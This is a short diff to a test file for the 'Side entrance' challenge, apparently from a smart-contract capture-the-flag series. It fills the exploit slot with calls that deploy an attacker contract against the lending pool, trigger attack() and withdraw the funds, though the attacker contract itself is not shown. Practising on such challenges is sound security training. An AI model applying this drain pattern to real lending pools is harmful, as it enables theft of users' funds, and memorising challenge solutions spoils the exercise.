@@ -2,6 +2,7 @@ const { ether, balance } = require('@openzeppelin/test-helpers');
 const { accounts, contract } = require('@openzeppelin/test-environment');
 
 const SideEntranceLenderPool = contract.fromArtifact('SideEntranceLenderPool');
+const attackerSideEntranceContract = contract.fromArtifact('SideEntrance');
 
 const { expect } = require('chai');
 
@@ -26,6 +27,9 @@ describe('[Challenge] Side entrance', function () {
 
     it('Exploit', async function () {
         /** YOUR EXPLOIT GOES HERE */
+        const attackerContract = await attackerSideEntranceContract.new(this.pool.address,{ from: attacker });
+        const tx = await attackerContract.attack();
+        const withdraw = await attackerContract.withdraw();
     });
 
     after(async function () {
